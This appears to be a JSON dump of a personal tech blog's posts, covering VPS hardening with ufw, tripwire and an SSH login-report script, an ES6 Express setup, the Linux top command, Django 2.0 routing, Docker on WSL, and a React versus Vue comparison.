allow 80/tcpufw allow ssh只开启两个服务，web service和ssh service。 还有一些建议 事实上，攻击我服的方式太多了，暴力破解密码登录只是其中一种，还有很多是利用软件漏洞进行的，还记得上一年一连串令人发指的漏洞吗：HeartBleed, Shellshock！！为了牢记这些惨痛的教训（别人身上的），谨记： 关注安全动态，即时更新软件安全补丁！ 限制服务，只让该运行的服务运行！ 在安装非官方包的时候，提高警惕，小心被掉包!全城警戒建好城墙，就该部署哨兵了。 那么该如何监测服务器的健康状态呢？ 在linux下还是有一些工具可以使用的，经过一番对比，我最终选择了tripwire。她可以检测linux关键文件的变化情况,比如/usr/bin目录下面的文件。所以我配置了一个crontab，每天早上3点检查一遍系统关键文件，看看是否有问题，并且邮件报告给我。 邮件crontab配置： 30 14 * /usr/sbin/tripwire –check | mail -s “Tripwire report for uname -n“ monklof@gmail.com -r report.tripwire这样，每天我都可以通过文件查看系统是否被破坏了。 汲取这次教训，为了能每天检测用户登录和情况，我特意写了一个脚本来检查昨天系统的登录情况： login_review.sh: #! /usr/bin/env bash monitor yesterday’s login via ssh, and send report emaildate=date -d &quot;yesterday&quot; +&quot;%b %e&quot;yesterday_acceptedlog=grep &quot;${date}.*sshd.*Accepted&quot; /var/log/auth.log | grep -v &quot;sudo&quot;fail=grep &quot;${date}.*sshd.*Failed&quot; /var/log/auth.log | grep -v &quot;sudo&quot; | wc -l success=printf &quot;%s&quot; &quot;$yesterday_acceptedlog&quot; |wc -l warn=””if [ $success -gt 0 ]thenwarn=”[WARN] “fi html=”&lt;!doctype html&gt; ${warn}SSH Login Reports for uname -n at $date Success logins: $success Time User Login Method echo $yesterday_acceptedlog | awk &#39;{if(length !=0)printf \\&quot;&lt;tr&gt;&lt;td&gt;%s&lt;/td&gt;&lt;td&gt;%s&lt;/td&gt;&lt;td&gt;%s (%s:%s)&lt;/td&gt;&lt;/tr&gt;\\n\\&quot;,$3,$9,$7,$11,$13}&#39; &lt;strong&gt;Failed Trys: &lt;/strong&gt; $fail &lt;br /&gt; &lt;/div&gt; “ case $1 in-d | –debug) printf “Success logs: %d\\n%s\\nRendered Html:\\n%s” $success “$yesterday_acceptedlog” “$html” ;;*) echo $html | mail -s “${warn}SSH Login Report for uname -n at $date” monklof@gmail.com -r report.login_review -a “Content-type: text/html” ;;esac然后也配置一个crontab，每天都检测: 25 14 * /usr/local/bin/login_review.sh这样，我每天就能收到这样的两份报表了： ╮(╯▽╰)╭ 博客停了将近一个星期之后，做好了基本的防护，小心翼翼的将服务器再次开启。（以上的安全策略的实施也是在服务开启之后一直在进行的） 服务器重新开启的那天，通过DO的运维界面查看被攻击的那天的流量情况： 可以看到29号那天tcp syn flood流量达到了140Mbps！心有余悸啊心有余悸。 然后接下来的几天，每天都看fail2ban查看被封禁的ip、看报表查看系统健康状况。效果显著，每天的暴破失败尝试量从上万成功降低到500以内。并且至今未出现过问题。 Cheers！这个时候，我的表情是这样的：","categories":[],"tags":[{"name":"VPS","slug":"VPS","permalink":"http://yoursite.com/tags/VPS/"},{"name":"运营","slug":"运营","permalink":"http://yoursite.com/tags/运营/"},{"name":"爆破端口","slug":"爆破端口","permalink":"http://yoursite.com/tags/爆破端口/"},{"name":"firewalld","slug":"firewalld","permalink":"http://yoursite.com/tags/firewalld/"},{"name":"脚本小子","slug":"脚本小子","permalink":"http://yoursite.com/tags/脚本小子/"}]},{"title":"ES6来完成NodeJs","slug":"ES6来完成NodeJs","date":"2018-03-09T06:28:01.000Z","updated":"2018-03-09T06:29:31.362Z","comments":true,"path":"2018/03/09/ES6来完成NodeJs/","link":"","permalink":"http://yoursite.com/2018/03/09/ES6来完成NodeJs/","excerpt":"","text":"ES2015或ES6是指JavaScript最新的稳定的迭代版本。 ES6是JavaScript的重大更新，也是自2009年ES5标准化之后的第一次更新。这次更新包括了一些新的语言语法，其中有一部分被看做是语法糖。 目前主流JavaScript引擎还没有完全实现这些新功能，需要进行一些转换才能在旧的JavaScript中使用这些新功能。 在本教程中，我们将使用ES6创建一个Express应用。我们将会使用Babel编译器将ES6代码编译为ES5。 用Babel编译器我们可以在Express应用中使用JavaScript的新特性。当然你也需要治疗JavaScript的基础知识才能够成功完成本教程中的内容。 根据Babel的官网来看，我们可以用它来使用下一代JavaScript、 本教程假设你已经安装了 Node Package Manager(NPM)和 NodeJS 引擎。 学习本教程的时候最好使用 linux 或者 mac Os 系统。当然，使用 windows 系统也可以正常进行。 第一步：安装项目文件夹 创建一个新的文件夹 用terminal进入这个文件夹 运行以下命令来初始化你的项目1npm init -y 这将会帮你在你的项目中创建一个 package.json 文件。在这一步中，你的 package.json 文件应该与下面这个例子非常相似： 1234567891011&#123; \"name\": \"es6express\", \"version\": \"1.0.0\", \"description\": \"\", \"main\": \"index.js\", \"scripts\": &#123; \"test\": \"echo \\\"Error: no test specified\\\" &amp;&amp; exit 1\" &#125;, \"author\": \"\", \"license\": \"ISC\"&#125; 第二步：创建程序入口 在你项目的根目录下，创建 index.js 文件 第三步：安装需要的模块（dependencies/devDependencies ）在这一步中，我们将会安装 express 应用需要的模块。 Dependencies注意这些依赖是可选的，只是因为我们创建 express 应用才需要。 express：一个快速的、无限制的、简约的 NodeJS web 框架 margan：NodeJS 的 http 请求记录中间件 要安装这些依赖，在你项目中间夹中打开 terminal，运行以下命令： 1npm install --save express morgan 在这一步，你的项目目录中应该会有一个 node_modules 文件夹，你的 package.json 文件应该与下面的这个例子类似： 123456789101112131415&#123; \"name\": \"es6express\", \"version\": \"1.0.0\", \"description\": \"\", \"main\": \"index.js\", \"scripts\": &#123; \"test\": \"echo \\\"Error: no test specified\\\" &amp;&amp; exit 1\" &#125;, \"author\": \"\", \"license\": \"ISC\", \"dependencies\": &#123; \"express\": \"^4.15.2\", \"morgan\": \"^1.8.1\" &#125;&#125; Development Dependencies这些依赖是用于在我们项目中使用 babel 编译器的： babel-cli：使用 babel 命令行编译文件 babel-preset-es2015 ：Babel 为ES2015预设的插件 rimraf：在 NodeJS 中使用 unix 命令 rm -rf 在这一步，你的 package.json 文件应该与下面这个例子类似： 1234567891011121314151617181920&#123; \"name\": \"es6express\", \"version\": \"1.0.0\", \"description\": \"\", \"main\": \"index.js\", \"scripts\": &#123; \"test\": \"echo \\\"Error: no test specified\\\" &amp;&amp; exit 1\" &#125;, \"author\": \"\", \"license\": \"ISC\", \"dependencies\": &#123; \"express\": \"^4.15.2\", \"morgan\": \"^1.8.1\" &#125;, \"devDependencies\": &#123; \"babel-cli\": \"^6.24.0\", \"babel-preset-es2015\": \"^6.24.0\", \"rimraf\": \"^2.6.1\" &#125;&#125; 第四步：在你项目的根目录下创建一个 Babel 配置文件 运行以下命令来创建一个 babel 配置文件 1touch .babelrc 这个文件是用来告诉 babel 如何转换你的 JavaScript 文件。我们将会把我们的ES6代码转换为ES5代码。 打开你的 .babelrc文件，把以下代码段复制到你的文件中，并保存。 123&#123; \"presets\": [\"es2015\"]&#125; 第五步：使用 Babel 来编译我们的 JavaScript 文件我们要做的下一步就是使用 babel 把我们的 JavaScript 代码从ES6编译为ES5（我们现在还没有写什么 JavaScript 代码）。 在你的 package.json 文件中，添加一个 start 和 build 命令。你的 package.json 文件应该与下面例子类似： 12345678910111213141516171819202122&#123; \"name\": \"es6express\", \"version\": \"1.0.0\", \"description\": \"\", \"main\": \"index.js\", \"scripts\": &#123; \"test\": \"echo \\\"Error: no test specified\\\" &amp;&amp; exit 1\", \"build\": \"rimraf dist/ &amp;&amp; babel ./ --out-dir dist/ --ignore ./node_modules,./.babelrc,./package.json,./npm-debug.log --copy-files\", \"start\": \"npm run build &amp;&amp; node dist/index.js\" &#125;, \"author\": \"\", \"license\": \"ISC\", \"dependencies\": &#123; \"express\": \"^4.15.2\", \"morgan\": \"^1.8.1\", \"rimraf\": \"^2.6.1\" &#125;, \"devDependencies\": &#123; \"babel-cli\": \"^6.24.0\", \"babel-preset-es2015\": \"^6.24.0\" &#125;&#125; 恭喜你！你现在已经可以在你的 express 中使用 JavaScript 的新特性了。","categories":[],"tags":[{"name":"CSS","slug":"CSS","permalink":"http://yoursite.com/tags/CSS/"},{"name":"前端","slug":"前端","permalink":"http://yoursite.com/tags/前端/"},{"name":"JavaScript","slug":"JavaScript","permalink":"http://yoursite.com/tags/JavaScript/"},{"name":"ES6","slug":"ES6","permalink":"http://yoursite.com/tags/ES6/"},{"name":"React","slug":"React","permalink":"http://yoursite.com/tags/React/"},{"name":"Vue","slug":"Vue","permalink":"http://yoursite.com/tags/Vue/"},{"name":"Dom","slug":"Dom","permalink":"http://yoursite.com/tags/Dom/"},{"name":"Angular","slug":"Angular","permalink":"http://yoursite.com/tags/Angular/"},{"name":"NodeJs","slug":"NodeJs","permalink":"http://yoursite.com/tags/NodeJs/"}]},{"title":"一文详解 Linux 系统常用监控工具","slug":"一文详解-Linux-系统常用监控工具","date":"2018-02-04T12:19:29.000Z","updated":"2018-10-04T12:21:37.575Z","comments":true,"path":"2018/02/04/一文详解-Linux-系统常用监控工具/","link":"","permalink":"http://yoursite.com/2018/02/04/一文详解-Linux-系统常用监控工具/","excerpt":"","text":".. _top: top linux下的任务管理器top命令是Linux下常用的性能分析工具，能够实时显示系统中各个进程的资源占用状况，类似于Windows的任务管理器。top是一个动态显示过程,即可以通过用户按键来不断刷新当前状态.如果在前台执行该命令,它将独占前台,直到用户终止该程序为止.比较准确的说,top命令提供了实时的对系统处理器的状态监视.它将显示系统中CPU最“敏感”的任务列表.该命令可以按CPU使用.内存使用和执行时间对任务进行排序；而且该命令的很多特性都可以通过交互式命令或者在个人定制文件中进行设定。 :: $top top - 09:14:56 up 264 days, 20:56, 1 user, load average: 0.02, 0.04, 0.00 Tasks: 87 total, 1 running, 86 sleeping, 0 stopped, 0 zombie Cpu(s): 0.0%us, 0.2%sy, 0.0%ni, 99.7%id, 0.0%wa, 0.0%hi, 0.0%si, 0.2%st Mem: 377672k total, 322332k used, 55340k free, 32592k buffers Swap: 397308k total, 67192k used, 330116k free, 71900k cached PID USER PR NI VIRT RES SHR S %CPU %MEM TIME+ COMMAND 1 root 20 0 2856 656 388 S 0.0 0.2 0:49.40 init 2 root 20 0 0 0 0 S 0.0 0.0 0:00.00 kthreadd 3 root 20 0 0 0 0 S 0.0 0.0 7:15.20 ksoftirqd/0 4 root RT 0 0 0 0 S 0.0 0.0 0:00.00 migration/0 第一行 09:14:56 ： 系统当前时间 264 days, 20:56 ： 系统开机到现在经过了多少时间 1 users ： 当前2用户在线 load average: 0.02, 0.04, 0.00： 系统1分钟、5分钟、15分钟的CPU负载信息 第二行 Tasks：任务; 87 total：很好理解，就是当前有87个任务，也就是87个进程。 1 running：1个进程正在运行 86 sleeping：86个进程睡眠 0 stopped：停止的进程数 0 zombie：僵死的进程数 第三行 Cpu(s)：表示这一行显示CPU总体信息 0.0%us：用户态进程占用CPU时间百分比，不包含renice值为负的任务占用的CPU的时间。 0.7%sy：内核占用CPU时间百分比 0.0%ni：改变过优先级的进程占用CPU的百分比 99.3%id：空闲CPU时间百分比 0.0%wa：等待I/O的CPU时间百分比 0.0%hi：CPU硬中断时间百分比 0.0%si：CPU软中断时间百分比 注：这里显示数据是所有cpu的平均值，如果想看每一个cpu的处理情况，按1即可；折叠，再次按1； 第四行 Men：内存的意思 8175320kk total：物理内存总量 8058868k used：使用的物理内存量 116452k free：空闲的物理内存量 283084k buffers：用作内核缓存的物理内存量 第五行 Swap：交换空间 6881272k total：交换区总量 4010444k used：使用的交换区量 2870828k free：空闲的交换区量 4336992k cached：缓冲交换区总量 进程信息 再下面就是进程信息： PID：进程的ID USER：进程所有者 PR：进程的优先级别，越小越优先被执行 NInice：值 VIRT：进程占用的虚拟内存 RES：进程占用的物理内存 SHR：进程使用的共享内存 S：进程的状态。S表示休眠，R表示正在运行，Z表示僵死状态，N表示该进程优先值为负数 %CPU：进程占用CPU的使用率 %MEM：进程使用的物理内存和总内存的百分比 TIME+：该进程启动后占用的总的CPU时间，即占用CPU使用时间的累加值。 COMMAND：进程启动命令名称 top命令交互操作指令下面列出一些常用的 top命令操作指令 * q：退出top命令 * &lt;Space&gt;：立即刷新 * s：设置刷新时间间隔 * c：显示命令完全模式 * t:：显示或隐藏进程和CPU状态信息 * m：显示或隐藏内存状态信息 * l：显示或隐藏uptime信息 * f：增加或减少进程显示标志 * S：累计模式，会把已完成或退出的子进程占用的CPU时间累计到父进程的MITE+ * P：按%CPU使用率排行 * T：按MITE+排行 * M：按%MEM排行 * u：指定显示用户进程 * r：修改进程renice值 * kkill：进程 * i：只显示正在运行的进程 * W：保存对top的设置到文件^/.toprc，下次启动将自动调用toprc文件的设置。 * h：帮助命令。 * q：退出 注：强调一下，使用频率最高的是P、T、M，因为通常使用top，我们就想看看是哪些进程最耗cpu资源、占用的内存最多；注：通过”shift + &gt;”或”shift + &lt;”可以向右或左改变排序列如果只需要查看内存：可用free命令。只查看uptime信息（第一行），可用uptime命令； 实例实例1：多核CPU监控^^^^^^^^^^^^^^^^^^^^^^^在top基本视图中，按键盘数字“1”，可监控每个逻辑CPU的状况；:: [rdtfr@bl685cb4-t ^]$ top top - 09:10:44 up 20 days, 16:51, 4 users, load average: 3.82, 4.40, 4.40 Tasks: 1201 total, 10 running, 1189 sleeping, 0 stopped, 2 zombie Cpu0 : 1.3%us, 2.3%sy, 0.0%ni, 96.4%id, 0.0%wa, 0.0%hi, 0.0%si, 0.0%st Cpu1 : 1.3%us, 2.6%sy, 0.0%ni, 96.1%id, 0.0%wa, 0.0%hi, 0.0%si, 0.0%st Cpu2 : 1.0%us, 2.0%sy, 0.0%ni, 92.5%id, 0.0%wa, 0.0%hi, 4.6%si, 0.0%st Cpu3 : 3.9%us, 7.8%sy, 0.0%ni, 83.2%id, 0.0%wa, 0.0%hi, 5.2%si, 0.0%st Cpu4 : 4.2%us, 10.4%sy, 0.0%ni, 63.8%id, 0.0%wa, 0.0%hi, 21.5%si, 0.0%st Cpu5 : 6.8%us, 12.7%sy, 0.0%ni, 80.5%id, 0.0%wa, 0.0%hi, 0.0%si, 0.0%st Cpu6 : 2.9%us, 7.2%sy, 0.0%ni, 85.3%id, 0.0%wa, 0.0%hi, 4.6%si, 0.0%st Cpu7 : 6.2%us, 13.0%sy, 0.0%ni, 75.3%id, 0.0%wa, 0.0%hi, 5.5%si, 0.0%st Mem: 32943888k total, 32834216k used, 109672k free, 642704k buffers Swap: 35651576k total, 5761928k used, 29889648k free, 16611500k cached 实例2：高亮显示当前运行进程^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^:: 在top基本视图中,按键盘“b”（打开/关闭加亮效果）； 实例3：显示完整的程序命令^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^命令：top -c:: [rdtfr@bl685cb4-t ^]$ top -c top - 09:14:35 up 20 days, 16:55, 4 users, load average: 5.77, 5.01, 4.64 Tasks: 1200 total, 5 running, 1192 sleeping, 0 stopped, 3 zombie Cpu(s): 4.4%us, 6.0%sy, 0.0%ni, 83.8%id, 0.2%wa, 0.0%hi, 5.5%si, 0.0%st Mem: 32943888k total, 32842896k used, 100992k free, 591484k buffers Swap: 35651576k total, 5761808k used, 29889768k free, 16918824k cached PID USER PR NI VIRT RES SHR S %CPU %MEM TIME+ COMMAND 2013 apache 18 0 403m 88m 5304 S 25.0 0.3 6:37.44 /usr/sbin/httpd 18335 pubtest 22 0 65576 996 728 R 7.8 0.0 0:00.24 netstat -naltp 16499 rdtfare 15 0 13672 2080 824 R 2.6 0.0 0:00.38 top -c 29684 rdtfare 15 0 1164m 837m 14m S 2.3 2.6 148:47.54 ./autodata data1.txt 12976 pubtest 18 0 238m 9000 1932 S 1.6 0.0 439:28.44 tscagent -s TOEV_P 实例4：显示指定的进程信息^^^^^^^^^^^^^^^^^^^^^^^^^^^^命令：top -p pidid:: /opt/app/tdv1/config#top -p 17265 top - 09:17:34 up 455 days, 17:55, 2 users, load average: 3.76, 4.56, 4.46 Tasks: 1 total, 0 running, 1 sleeping, 0 stopped, 0 zombie Cpu(s): 7.8%us, 1.9%sy, 0.0%ni, 89.2%id, 0.0%wa, 0.1%hi, 1.0%si, 0.0%st Mem: 8175452k total, 8103988k used, 71464k free, 268716k buffers Swap: 6881272k total, 4275424k used, 2605848k free, 6338184k cached PID USER PR NI VIRT RES SHR S %CPU %MEM TIME+ COMMAND 17265 tdv1 15 0 56504 828 632 S 0.0 0.0 195:53.25 redis-server 指定进程信息有多个时，需要结合其它工具将回车替换为,（-p 支持pid,pid,pid语法） 命令：top -p pgrep MULTI_PROCESS | tr &quot;\\\\n&quot; &quot;,&quot; | sed &#39;s/,$//&#39; :: /opt/app/tdv1$top -p `pgrep java | tr &quot;\\\\n&quot; &quot;,&quot; | sed &apos;s/,$//&apos;` top - 14:05:31 up 53 days, 2:43, 9 users, load average: 0.29, 0.34, 0.22 Tasks: 3 total, 0 running, 3 sleeping, 0 stopped, 0 zombie Cpu(s): 5.9%us, 8.2%sy, 0.0%ni, 86.0%id, 0.0%wa, 0.0%hi, 0.0%si, 0.0%st Mem: 66082088k total, 29512860k used, 36569228k free, 756352k buffers Swap: 32767992k total, 1019900k used, 31748092k free, 15710284k cached PID USER PR NI VIRT RES SHR S %CPU %MEM TIME+ COMMAND 27855 rdtfare 20 0 4454m 1.3g 5300 S 0.7 2.0 338:31.37 java 2034 jenkins 20 0 18.3g 5.2g 5284 S 0.3 8.2 56:02.38 java 12156 rdtfare 20 0 4196m 1.2g 12m S 0.3 2.0 86:34.62 java 更强大的工具htop^^^^^^^^^^^^^^^^^^^^htop 是一个 Linux 下的交互式的进程浏览器，可以用来替换Linux下的top命令。 与Linux传统的top相比，htop更加人性化。它可让用户交互式操作，支持颜色主题，可横向或纵向滚动浏览进程列表，并支持鼠标操作。 与top相比，htop有以下优点： 可以横向或纵向滚动浏览进程列表，以便看到所有的进程和完整的命令行。 在启动上，比top 更快。 杀进程时不需要输入进程号。 htop 支持鼠标操作。","categories":[],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://yoursite.com/tags/Linux/"},{"name":"top","slug":"top","permalink":"http://yoursite.com/tags/top/"},{"name":"iftop","slug":"iftop","permalink":"http://yoursite.com/tags/iftop/"},{"name":"htop","slug":"htop","permalink":"http://yoursite.com/tags/htop/"}]},{"title":"Django2.0","slug":"Django2-0","date":"2017-10-27T04:15:18.000Z","updated":"2018-03-28T14:04:18.623Z","comments":true,"path":"2017/10/27/Django2-0/","link":"","permalink":"http://yoursite.com/2017/10/27/Django2-0/","excerpt":"","text":"9月23，Django 发布了2.0a1版本，这是一个 feature freeze 版本，如果没有什么意外的话，2.0正式版不会再增加新的功能了。按照以往的规律，预计正式版将在12月发布。 备注：Django 2.0 于12月2日已经正式发布。 2.0无疑是一个里程碑版本，移除了对 Python2.7 的支持，最少需要 3.4 以上，建议使用3.5以上的版本。 What’s new in Django2.0 文档中一共列出了三个新的特性： 更简单的URL路由语法 (Simplified URL routing syntax)admin应用的针对移动设备的优化改进(Mobile-friendly contrib.admin)支持SQL开窗表达式(Window expressions)第一个特性，主要用于动态路由定义上。在Django2.0代码实现中，主要的变化是新增了 django.urls.path 函数，它允许使用一种更加简洁、可读的路由语法。比如之前的版本的代码： url(r&apos;^articles/(?P&lt;year&gt;[0-9]{4})/$&apos;, views.year_archive), 在新版本中也可以写为： path(‘articles/int:year/‘, views.year_archive), 问题引入下面是Django1.X的一段代码： ‘’’pythonfrom django.conf.urls import urldef year_archive(request, year): year = int(year) # convert str to int # Get articles from database def detail_view(request, article_id): passdef edit_view(request, article_id): passdef delete_view(request, article_id): passurlpatterns = [ url(‘articles/(?P[0-9]{4})/‘, year_archive), url(‘article/(?P&lt;article_id&gt;[a-zA-Z0-9]+)/detail/‘, detail_view), url(‘articles/(?P&lt;article_id&gt;[a-zA-Z0-9]+)/edit/‘, edit_view), url(‘articles/(?P&lt;article_id&gt;[a-zA-Z0-9]+)/delete/‘, delete_view),]‘’’","categories":[],"tags":[{"name":"VPS","slug":"VPS","permalink":"http://yoursite.com/tags/VPS/"},{"name":"Django","slug":"Django","permalink":"http://yoursite.com/tags/Django/"},{"name":"后端","slug":"后端","permalink":"http://yoursite.com/tags/后端/"},{"name":"Python","slug":"Python","permalink":"http://yoursite.com/tags/Python/"},{"name":"Rail","slug":"Rail","permalink":"http://yoursite.com/tags/Rail/"},{"name":"MVC","slug":"MVC","permalink":"http://yoursite.com/tags/MVC/"},{"name":"语法堂","slug":"语法堂","permalink":"http://yoursite.com/tags/语法堂/"}]},{"title":"Installing the Docker client on Windows Subsystem for Linux (Ubuntu)","slug":"Installing-the-Docker-client-on-Windows-Subsystem-for-Linux-Ubuntu","date":"2017-09-25T12:09:25.000Z","updated":"2018-03-14T12:45:44.036Z","comments":true,"path":"2017/09/25/Installing-the-Docker-client-on-Windows-Subsystem-for-Linux-Ubuntu/","link":"","permalink":"http://yoursite.com/2017/09/25/Installing-the-Docker-client-on-Windows-Subsystem-for-Linux-Ubuntu/","excerpt":"","text":"I’m a PC guy, I have always been. I played around a little bit with Linux back in the university days, but that was it. But now, Windows brought Linux a little closer. I don’t have to do anything complicated like dual booting or having another computer set up just to experience the Linux (non GUI) environment. As a Windows Insider, I tried the Windows Subsystem for Linux since day 1 and I really enjoyed it. Now that Falls Creators Update is out, I’m using the Ubuntu distro from the store, and the first thing I want to do is having the Docker client installed.. It is not rocket science, but I did have some bumps on the road (because of my pretty low knowledge of Linux), so I thought I’d write what I’ve done to achieve that, in case it could be useful to somebody else. There’s something you need to understand first. The Docker Engine does not run on WSL, you HAVE to have Docker For Windows installed on your host machine. What we’ll end up with at the end of this document is the Docker client running on Linux (WSL) sending commands to your Docker Engine daemon installed on Windows. So, open you Ubuntu bash console, the first thing is to install the client. In order to do that you have to use apt-get, which is Ubuntu’s package manager (more info about apt here). Update the apt package index:$ sudo apt-get update 2. Install packages to allow apt to use a repository over HTTPS: $ sudo apt-get install \\ apt-transport-https \\ ca-certificates \\ curl \\ software-properties-common 3. Add Docker’s official GPG key: $ curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add - Verify that you now have the key with the fingerprint 9DC8 5822 9FC7 DD38 854A E2D8 8D81 803C 0EBF CD88, by searching for the last 8 characters of the fingerprint. $ sudo apt-key fingerprint 0EBFCD88 pub 4096R/0EBFCD88 2017–02–22 Key fingerprint = 9DC8 5822 9FC7 DD38 854A E2D8 8D81 803C 0EBF CD88uid Docker Release (CE deb) &#x64;&#111;&#99;&#107;&#101;&#x72;&#x40;&#x64;&#111;&#99;&#x6b;&#x65;&#114;&#x2e;&#99;&#111;&#109;sub 4096R/F273FCD8 2017–02–22 4. Use the following command to set up the stable repository. You always need the stable repository, even if you want to install builds from the edge or test repositories as well. To add the edge or test repository, add the word edge or test (or both) after the word stable in the commands below. $ sudo add-apt-repository \\ “deb [arch=amd64] https://download.docker.com/linux/ubuntu \\ $(lsb_release -cs) \\ stable” Now we’re ready to install Docker Community Edition 5. Update the apt package index again $ sudo apt-get update 6. And install Docker CE $ sudo apt-get install docker-ce When that finishes, you’ll end up having everything installed in Linux, but as I mentioned before, the Docker Engine does not run in WSL so if you write any command like docker images, you’ll see a message like this one: Cannot connect to the Docker daemon at unix:///var/run/docker.sock. Is the docker daemon running?No, it is not running and it’ll never be, at least for now. You need to tell the Docker client where the Docker host is, and you can do that by using the -H option as follows: $ docker -H localhost:2375 images If you don’t want to type the host every time, you can set up and environment variable called DOCKER_HOST to localhost:2375 $ export DOCKER_HOST=localhost:2375 Now just running docker images will show the images in your host environment. But, that environment variable will last only as long as the session does. You would have to set it every time you open bash. So, in order to avoid that, you set that variable in a file called .bash_profile in your home directory, like this: $ echo “export DOCKER_HOST=localhost:2375” &gt;&gt; ~/.bash_profile Restart the bash console and the DOCKER_HOST variable should be there, just type docker images to check everything is there. I hope this post will help other, if it does, let me know. EDIT: Make sure you expose the daemon on Windows, otherwise it won’t work. References: Get Docker CE for Ubuntu Special thanks to Rich Turner for his kindness and patience. EDIT: I recently learned there’s an official, more complicated but secure, way of achieving the same, so I thought I’d share it here: WSL Interoperability with Docker","categories":[],"tags":[{"name":"Docker","slug":"Docker","permalink":"http://yoursite.com/tags/Docker/"},{"name":"部署","slug":"部署","permalink":"http://yoursite.com/tags/部署/"},{"name":"VPS","slug":"VPS","permalink":"http://yoursite.com/tags/VPS/"},{"name":"Ubutun","slug":"Ubutun","permalink":"http://yoursite.com/tags/Ubutun/"},{"name":"WSL","slug":"WSL","permalink":"http://yoursite.com/tags/WSL/"},{"name":"Window 10","slug":"Window-10","permalink":"http://yoursite.com/tags/Window-10/"}]},{"title":"docker初探","slug":"docker初探","date":"2017-09-12T13:38:27.000Z","updated":"2018-03-12T14:04:34.316Z","comments":true,"path":"2017/09/12/docker初探/","link":"","permalink":"http://yoursite.com/2017/09/12/docker初探/","excerpt":"","text":"Docker CE 还是 Docker EEDocker在2016年很早的时候就明确了将会在企业级方面重点跟进。而在短短的一年时间之内推出的1.12和1.13的版本在功能上确实是很大的进步。而在2017年的3月1号之后，Docker的版本命名开始发生变化，同时将CE版本和EE版本进行分开，而这些也是突然发现docker1.13的安装脚本不好用了才发现的，一起简单来看一下具体情况吧。 平台支持目前docker的CE和EE所支持的平台情况如下所示，大家所钟情的Ubuntu和CentOS作为Linux发行版所支持的CE和EE均支持的。 Get Started, Part 1: Orientation and setupWelcome! We are excited that you want to learn Docker. The Docker Get Started Tutorialteaches you how to: Set up your Docker environment (on this page) Build an image and run it as one container Scale your app to run multiple containers Distribute your app across a cluster Stack services by adding a backend database Deploy your app to production Docker conceptsDocker is a platform for developers and sysadmins to develop, deploy, and runapplications with containers. The use of Linux containers to deploy applicationsis called containerization. Containers are not new, but their use for easilydeploying applications is. Containerization is increasingly popular because containers are: Flexible: Even the most complex applications can be containerized. Lightweight: Containers leverage and share the host kernel. Interchangeable: You can deploy updates and upgrades on-the-fly. Portable: You can build locally, deploy to the cloud, and run anywhere. Scalable: You can increase and automatically distribute container replicas. Stackable: You can stack services vertically and on-the-fly. Images and containersA container is launched by running an image. An image is an executablepackage that includes everything needed to run an application–the code, aruntime, libraries, environment variables, and configuration files. A container is a runtime instance of an image–what the image becomes inmemory when executed (that is, an image with state, or a user process). You cansee a list of your running containers with the command, docker ps, just as youwould in Linux. Containers and virtual machinesA container runs natively on Linux and shares the kernel of the hostmachine with other containers. It runs a discrete process, taking no more memorythan any other executable, making it lightweight. By contrast, a virtual machine (VM) runs a full-blown “guest” operatingsystem with virtual access to host resources through a hypervisor. In general,VMs provide an environment with more resources than most applications need. Prepare your Docker environmentInstall a maintained version of Docker Community Edition (CE) or Enterprise Edition (EE) on a supported platform. Ensure that you have a supported version of Docker: ‘’’$ docker –versionDocker version 17.12.0-ce, build c97c6d6 ‘’’","categories":[],"tags":[{"name":"VPS","slug":"VPS","permalink":"http://yoursite.com/tags/VPS/"},{"name":"Linux","slug":"Linux","permalink":"http://yoursite.com/tags/Linux/"},{"name":"docker","slug":"docker","permalink":"http://yoursite.com/tags/docker/"},{"name":"虚拟机","slug":"虚拟机","permalink":"http://yoursite.com/tags/虚拟机/"},{"name":"搭建","slug":"搭建","permalink":"http://yoursite.com/tags/搭建/"},{"name":"管理","slug":"管理","permalink":"http://yoursite.com/tags/管理/"}]},{"title":"React/vue","slug":"React-vue","date":"2016-03-12T06:24:14.000Z","updated":"2018-03-09T06:28:31.480Z","comments":true,"path":"2016/03/12/React-vue/","link":"","permalink":"http://yoursite.com/2016/03/12/React-vue/","excerpt":"","text":"2016年，React巩固了它JavaScript web框架之王的地位。在这一年里，Web和原生APP的库都迅速发展，同时与Angular相比，也具有明显优势。 与此同时，2016年对于Vue而言，也是很重要的一年。Vue2的发布给JavaScript社区带来了巨大的冲击，在Github上获得了25000个star。 不可否认，React和Vue的范围十分类似：它们都是轻量级的组件库，都用于构建用户界面，专注于视图层。两者都可以在简单项目中，也可以使用工具将它们扩展为复杂的应用程序。 因此，很多web开发人员都想知道，到底应该选择哪一个？一个明显优于另一个？有什么需要注意的利弊吗？还是说，两者基本相同？ 两个框架，两个倡导者在本文中，我想彻底地公正地比较两者之前的区别。唯一的问题就是：我是Vue的爱好者，必然会有一些偏见。我经常在我的项目中使用Vue，还发布了一些在线教程，即Ultimate Vue.js Developers course 为了摆脱我偏见的影响，我找到了我的朋友Alexis Mangin，他是一名优秀的JavaScript开发者，也是React的爱好者。他沉浸在React中，经常在Web和移动APP开发中使用React。 Alexis曾经问我：“为什么你这么喜欢Vue，从来不用React？”。由于我不太了解React，我很难回答这个问题。所以，我决定，一起坐下来，展示我们选择的库，看看它们究竟能提供什么东西。 经过激烈的讨论和互相学习，我们得出了以下6个结论。 如果你喜欢使用模板（ 或需要一些其中的选项）构建应用程序，那么请选择Vue将标记放在HTML文件中是Vue应用程序的默认选项。与Angular类似，大括号用于数据绑定表达式，指令（特殊的HTML属性）用于向模板添加功能。下面是一个简单的Vue程序例子。它可以输出一条消息，有一个按钮可以动态反转消息： 12345678910111213141516&lt;div id=\"app\"&gt; &lt;p&gt;&#123;&#123; message &#125;&#125;&lt;/p&gt; &lt;button v-on:click=\"reverseMessage\"&gt;Reverse Message&lt;/button&gt;&lt;/div&gt;new Vue(&#123; el: '#app', data: &#123; message: 'Hello Vue.js! &#125;, methods: &#123; reverseMessage: function () &#123; this.message = this.message.split('').reverse().join(''); &#125; &#125;&#125;); 相比之下，React应用程序避开模板，要求开放人员在JavaScript中创建DOM，通常用JSX辅助，下面是用React来实现同样的功能： 123456789101112131415161718192021222324 class App extends React.Component &#123; constructor(props) &#123; super(props); this.state = &#123; message: 'Hello React.js!' &#125;; &#125; reverseMessage() &#123; this.setState(&#123; message: this.state.message.split('').reverse().join('') &#125;); &#125; render() &#123; return ( &lt;div&gt; 